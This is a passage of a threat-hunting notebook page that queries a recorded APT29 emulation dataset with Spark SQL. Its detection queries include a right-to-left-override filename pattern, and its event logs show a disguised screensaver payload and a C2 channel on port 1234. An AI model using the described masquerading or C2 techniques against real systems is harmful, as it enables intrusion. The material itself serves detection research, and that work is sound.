      setTimeout(run_inline_js, 100);
    } else if (!root._bokeh_failed_load) {
      console.log("Bokeh: BokehJS failed to load within specified timeout.");
      root._bokeh_failed_load = true;
    } else if (force !== true) {
      var cell = $(document.getElementById("1001")).parents('.cell').data().cell;
      cell.output_area.append_execute_result(NB_LOAD_WARNING)
    }

  }

  if (root._bokeh_is_loading === 0) {
    console.debug("Bokeh: BokehJS loaded, going straight to plotting");
    run_inline_js();
  } else {
    load_libs(css_urls, js_urls, function() {
      console.debug("Bokeh: BokehJS plotting callback run at", now());
      run_inline_js();
    });
  }
}(window));</script><div class="output text_html">





<div class="bk-root" id="468e4aa1-0c8c-4b46-927e-ef264735f8bf" data-root-id="1004"></div>
</div><script type="application/javascript">(function(root) {
  function embed_document(root) {
    
  var docs_json = {"2c44b4ba-cbbd-4ea5-8f3f-4eb289e07b09":{"roots":{"references":[{"attributes":{"below":[{"id":"1013"}],"center":[{"id":"1015"},{"id":"1019"},{"id":"1036"},{"id":"1056"}],"left":[{"id":"1016"}],"plot_height":550,"renderers":[{"id":"1026"},{"id":"1042"}],"title":{"id":"1028"},"toolbar":{"id":"1020"},"x_range":{"id":"1005"},"x_scale":{"id":"1009"},"y_range":{"id":"1007"},"y_scale":{"id":"1011"}},"id":"1004","subtype":"Figure","type":"Plot"},{"attributes":{"data_source":{"id":"1002"},"glyph":{"id":"1040"},"hover_glyph":null,"muted_glyph":null,"name":"needHover","nonselection_glyph":{"id":"1041"},"selection_glyph":null,"view":{"id":"1043"}},"id":"1042","type":"GlyphRenderer"},{"attributes":{"end":23},"id":"1007","type":"Range1d"},{"attributes":{"source":{"id":"1002"}},"id":"1043","type":"CDSView"},{"attributes":{"border_line_alpha":0.3,"border_line_color":"black","border_line_width":3,"items":[{"id":"1037"},{"id":"1052"}]},"id":"1036","type":"Legend"},{"attributes":{"fill_color":{"value":"#c9d9d3"},"line_color":{"value":"#c9d9d3"},"top":{"field":"sub-Steps"},"width":{"value":0.7},"x":{"field":"stepname","transform":{"id":"1022"}}},"id":"1024","type":"VBar"},{"attributes":{"axis":{"id":"1016"},"dimension":1,"ticker":null},"id":"1019","type":"Grid"},{"attributes":{"range":{"id":"1005"}},"id":"1022","type":"Dodge"},{"attributes":{},"id":"1017","type":"BasicTicker"},{"attributes":{"fill_color":{"value":"#718dbf"},"line_color":{"value":"#718dbf"},"top":{"field":"covered"},"width":{"value":0.7},"x":{"field":"stepname","transform":{"id":"1038"}}},"id":"1040","type":"VBar"},{"attributes":{"axis_label":"Count of Sub-Steps","formatter":{"id":"1031"},"ticker":{"id":"1017"}},"id":"1016","type":"LinearAxis"},{"attributes":{},"id":"1034","type":"UnionRenderers"},{"attributes":{},"id":"1035","type":"Selection"},{"attributes":{"data_source":{"id":"1002"},"glyph":{"id":"1024"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1025"},"selection_glyph":null,"view":{"id":"1027"}},"id":"1026","type":"GlyphRenderer"},{"attributes":{"source":{"id":"1002"}},"id":"1027","type":"CDSView"},{"attributes":{"range":{"id":"1005"}},"id":"1038","type":"Dodge"},{"attributes":{"align":"center","text":"Telemetry Detection Category (Average Coverage: 82%)","text_font_size":{"value":"12pt"}},"id":"1028","type":"Title"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1003"}]},"id":"1020","type":"Toolbar"},{"attributes":{"data":{"covered":[5,4,6,19,2,3,6,7,12,1],"percentage":["83%","67%","75%","100%","100%","60%","86%","88%","86%","25%"],"stepname":["1:Initial Compromise","2:Collection & Exfiltration","3:Deploy Stealth Toolkit","4:Clean Up","5:Establish Persistence","6:Credential Access","7:Collection & Exfiltration","8:Expand Access","9:Clean Up, Collection and Exfiltration","10:Persistence Execution"],"sub-Steps":[6,6,8,19,2,5,7,8,14,4]},"selected":{"id":"1035"},"selection_policy":{"id":"1034"}},"id":"1002","type":"ColumnDataSource"},{"attributes":{"level":"glyph","source":{"id":"1002"},"text":{"field":"sub-Steps"},"text_align":"center","x":{"field":"stepname"},"y":{"field":"sub-Steps"}},"id":"1056","type":"LabelSet"},{"attributes":{"label":{"value":"Total"},"renderers":[{"id":"1026"}]},"id":"1037","type":"LegendItem"},{"attributes":{},"id":"1014","type":"CategoricalTicker"},{"attributes":{},"id":"1011","type":"LinearScale"},{"attributes":{"axis_label":"Emulation Steps","formatter":{"id":"1033"},"major_label_orientation":45,"ticker":{"id":"1014"}},"id":"1013","type":"CategoricalAxis"},{"attributes":{"axis":{"id":"1013"},"ticker":null},"id":"1015","type":"Grid"},{"attributes":{"label":{"value":"Covered"},"renderers":[{"id":"1042"}]},"id":"1052","type":"LegendItem"},{"attributes":{},"id":"1031","type":"BasicTickFormatter"},{"attributes":{},"id":"1009","type":"CategoricalScale"},{"attributes":{"factors":["1:Initial Compromise","2:Collection & Exfiltration","3:Deploy Stealth Toolkit","4:Clean Up","5:Establish Persistence","6:Credential Access","7:Collection & Exfiltration","8:Expand Access","9:Clean Up, Collection and Exfiltration","10:Persistence Execution"]},"id":"1005","type":"FactorRange"},{"attributes":{"fill_alpha":{"value":0.1},"fill_color":{"value":"#718dbf"},"line_alpha":{"value":0.1},"line_color":{"value":"#718dbf"},"top":{"field":"covered"},"width":{"value":0.7},"x":{"field":"stepname","transform":{"id":"1038"}}},"id":"1041","type":"VBar"},{"attributes":{},"id":"1033","type":"CategoricalTickFormatter"},{"attributes":{"callback":null,"names":["needHover"],"tooltips":[["Covered","@covered"],["Percentage","@percentage"]]},"id":"1003","type":"HoverTool"},{"attributes":{"fill_alpha":{"value":0.1},"fill_color":{"value":"#c9d9d3"},"line_alpha":{"value":0.1},"line_color":{"value":"#c9d9d3"},"top":{"field":"sub-Steps"},"width":{"value":0.7},"x":{"field":"stepname","transform":{"id":"1022"}}},"id":"1025","type":"VBar"}],"root_ids":["1004"]},"title":"Bokeh Application","version":"2.2.2"}};
  var render_items = [{"docid":"2c44b4ba-cbbd-4ea5-8f3f-4eb289e07b09","root_ids":["1004"],"roots":{"1004":"468e4aa1-0c8c-4b46-927e-ef264735f8bf"}}];
  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);

  }
  if (root.Bokeh !== undefined) {
    embed_document(root);
  } else {
    var attempts = 0;
    var timer = setInterval(function(root) {
      if (root.Bokeh !== undefined) {
        clearInterval(timer);
        embed_document(root);
      } else {
        attempts++;
        if (attempts > 100) {
          clearInterval(timer);
          console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
        }
      }
    }, 10, root)
  }
})(window);</script></div>
</div>
</div>
<div class="section" id="import-libraries">
<h2>Import Libraries<a class="headerlink" href="#import-libraries" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pyspark.sql</span> <span class="kn">import</span> <span class="n">SparkSession</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="start-spark-session">
<h2>Start Spark Session<a class="headerlink" href="#start-spark-session" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">spark</span> <span class="o">=</span> <span class="n">SparkSession</span><span class="o">.</span><span class="n">builder</span><span class="o">.</span><span class="n">getOrCreate</span><span class="p">()</span>
<span class="n">spark</span><span class="o">.</span><span class="n">conf</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;spark.sql.caseSensitive&quot;</span><span class="p">,</span> <span class="s2">&quot;true&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="decompress-dataset">
<h2>Decompress Dataset<a class="headerlink" href="#decompress-dataset" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="o">!</span>wget https://github.com/OTRF/mordor/raw/master/datasets/large/apt29/day1/apt29_evals_day1_manual.zip
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>--2020-12-21 22:19:06--  https://github.com/OTRF/mordor/raw/master/datasets/large/apt29/day1/apt29_evals_day1_manual.zip
Resolving github.com (github.com)... 
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>140.82.114.3
Connecting to github.com (github.com)|140.82.114.3|:443... connected.
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>HTTP request sent, awaiting response... 
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>302 Found
Location: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/large/apt29/day1/apt29_evals_day1_manual.zip [following]
--2020-12-21 22:19:06--  https://raw.githubusercontent.com/OTRF/mordor/master/datasets/large/apt29/day1/apt29_evals_day1_manual.zip
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>200 OK
Length: 13944973 (13M) [application/zip]
Saving to: ‘apt29_evals_day1_manual.zip’


          apt29_eva   0%[                    ]       0  --.-KB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>         apt29_eval   8%[&gt;                   ]   1.07M  5.31MB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>        apt29_evals  21%[===&gt;                ]   2.92M  7.23MB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>       apt29_evals_  36%[======&gt;             ]   4.79M  7.92MB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>      apt29_evals_d  49%[========&gt;           ]   6.59M  8.18MB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>     apt29_evals_da  59%[==========&gt;         ]   7.88M  7.80MB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>    apt29_evals_day  67%[============&gt;       ]   9.04M  7.46MB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>   apt29_evals_day1  78%[==============&gt;     ]  10.38M  7.35MB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>  apt29_evals_day1_  88%[================&gt;   ]  11.79M  7.31MB/s               
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span> apt29_evals_day1_m  99%[==================&gt; ]  13.29M  7.32MB/s               
apt29_evals_day1_ma 100%[===================&gt;]  13.30M  7.32MB/s    in 1.8s    

2020-12-21 22:19:08 (7.32 MB/s) - ‘apt29_evals_day1_manual.zip’ saved [13944973/13944973]
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="o">!</span>unzip apt29_evals_day1_manual.zip
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Archive:  apt29_evals_day1_manual.zip
  inflating: apt29_evals_day1_manual_2020-05-01225525.json  
</pre></div>
</div>
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="import-datasets">
<h2>Import Datasets<a class="headerlink" href="#import-datasets" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df_day1_host</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">read</span><span class="o">.</span><span class="n">json</span><span class="p">(</span><span class="s1">&#39;apt29_evals_day1_manual_2020-05-01225525.json&#39;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="create-temporary-sql-view">
<h2>Create Temporary SQL View<a class="headerlink" href="#create-temporary-sql-view" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df_day1_host</span><span class="o">.</span><span class="n">createTempView</span><span class="p">(</span><span class="s1">&#39;apt29Host&#39;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="adversary-detection-steps">
<h2>Adversary - Detection Steps<a class="headerlink" href="#adversary-detection-steps" title="Permalink to this headline">¶</a></h2>
</div>
<div class="section" id="a-1-user-execution">
<h2>1.A.1. User Execution<a class="headerlink" href="#a-1-user-execution" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> User Pam executed payload rcs.3aka3.doc</p>
<p><strong>Criteria:</strong> The rcs.3aka3.doc process spawning from explorer.exe</p>
<div class="section" id="detection-type-telemetry-none">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#detection-type-telemetry-none" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:204B00B6-A92B-4EF7-8510-4FB237703147</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 1</span>
<span class="sd">    AND LOWER(ParentImage) LIKE &quot;%explorer.exe&quot;</span>
<span class="sd">    AND LOWER(Image) LIKE &quot;%3aka3%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:55:56.157
ProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
ProcessId: 8524
Image: C:\ProgramData\victim\â€®cod.3aka3.scr
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: &quot;C:\ProgramData\victim\â€®cod.3aka3.scr&quot; /S
CurrentDirectory: C:\ProgramData\victim\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-f331-370000000000}
LogonId: 0x3731F3
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=4B7FA56A4E85F88B98D11A6E018698AE3FBA5E62,MD5=9D1C5EF38E6073661C74660B3A71A76E,SHA256=0DF38A55D940F498478EB03683C94D4584236E100125B526A67650BA54DF4AE4,IMPHASH=F00447512A354E59D39D2818AABA4A17
ParentProcessGuid: {47ab858c-dac4-5eac-f202-000000000400}
ParentProcessId: 4440
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\windows\Explorer.EXE 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:52540C1E-DD76-41B2-93ED-CFBA2B94ECF7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">    AND EventID = 4688</span>
<span class="sd">    AND LOWER(ParentProcessName) LIKE &quot;%explorer.exe&quot;</span>
<span class="sd">    AND LOWER(NewProcessName) LIKE &quot;%3aka3%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x214c
	New Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x1158
	Creator Process Name:	C:\Windows\explorer.exe
	Process Command Line:	&quot;C:\ProgramData\victim\â€®cod.3aka3.scr&quot; /S

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="detection-type-general-none">
<h3>Detection Type:General(None)<a class="headerlink" href="#detection-type-general-none" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:DFD6A782-9BDB-4550-AB6B-525E825B095E</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND EventID = 13</span>
<span class="sd">  AND TargetObject RLIKE &#39;.*\\\\\\\\AppCompatFlags\\\\\\\\Compatibility Assistant\\\\\\\\Store\\\\\\\\.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:01:29.278
ProcessGuid: {47ab858c-cc06-5eac-9402-000000000400}
ProcessId: 1144
Image: C:\windows\system32\svchost.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\ProgramData\victim\â€®cod.3aka3.scr
Details: Binary Data 
-RECORD 1---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:21:27.385
ProcessGuid: {47ab858c-e737-5eac-fb00-000000000500}
ProcessId: 8460
Image: C:\windows\system32\svchost.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Windows\System32\hostui.exe
Details: Binary Data         
-RECORD 2---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:21:29.863
ProcessGuid: {47ab858c-e737-5eac-fb00-000000000500}
ProcessId: 8460
Image: C:\windows\system32\svchost.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Windows\System32\hostui.exe
Details: Binary Data         
-RECORD 3---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:21:29.863
ProcessGuid: {47ab858c-e737-5eac-fb00-000000000500}
ProcessId: 8460
Image: C:\windows\system32\svchost.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Windows\System32\hostui.exe
Details: Binary Data         
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-2-masquerading">
<h2>1.A.2. Masquerading<a class="headerlink" href="#a-2-masquerading" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Used unicode right-to-left override (RTLO) character to obfuscate file name rcs.3aka3.doc (originally cod.3aka.scr)</p>
<p><strong>Criteria:</strong> Evidence of the right-to-left override character (U+202E) in the rcs.3aka.doc process ​OR the original filename (cod.3aka.scr)</p>
<div class="section" id="id1">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:F4C71BF4-E068-493D-ABAA-0C5DFA02875D</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 1</span>
<span class="sd">    AND LOWER(Image) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:55:56.157
ProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
ProcessId: 8524
Image: C:\ProgramData\victim\â€®cod.3aka3.scr
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: &quot;C:\ProgramData\victim\â€®cod.3aka3.scr&quot; /S
CurrentDirectory: C:\ProgramData\victim\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-f331-370000000000}
LogonId: 0x3731F3
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=4B7FA56A4E85F88B98D11A6E018698AE3FBA5E62,MD5=9D1C5EF38E6073661C74660B3A71A76E,SHA256=0DF38A55D940F498478EB03683C94D4584236E100125B526A67650BA54DF4AE4,IMPHASH=F00447512A354E59D39D2818AABA4A17
ParentProcessGuid: {47ab858c-dac4-5eac-f202-000000000400}
ParentProcessId: 4440
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\windows\Explorer.EXE 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:D94222A0-72F9-4F1E-84A9-F14CA1098D44</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">    AND EventID = 4688</span>
<span class="sd">    AND LOWER(NewProcessName) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x214c
	New Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x1158
	Creator Process Name:	C:\Windows\explorer.exe
	Process Command Line:	&quot;C:\ProgramData\victim\â€®cod.3aka3.scr&quot; /S

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-3-uncommonly-used-port">
<h2>1.A.3. Uncommonly Used Port<a class="headerlink" href="#a-3-uncommonly-used-port" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Established C2 channel (192.168.0.5) via rcs.3aka3.doc payload over TCP port 1234</p>
<p><strong>Criteria:</strong> Established network channel over port 1234</p>
<div class="section" id="id2">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:B53A710B-43AB-4B57-BD92-4E787D494978</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
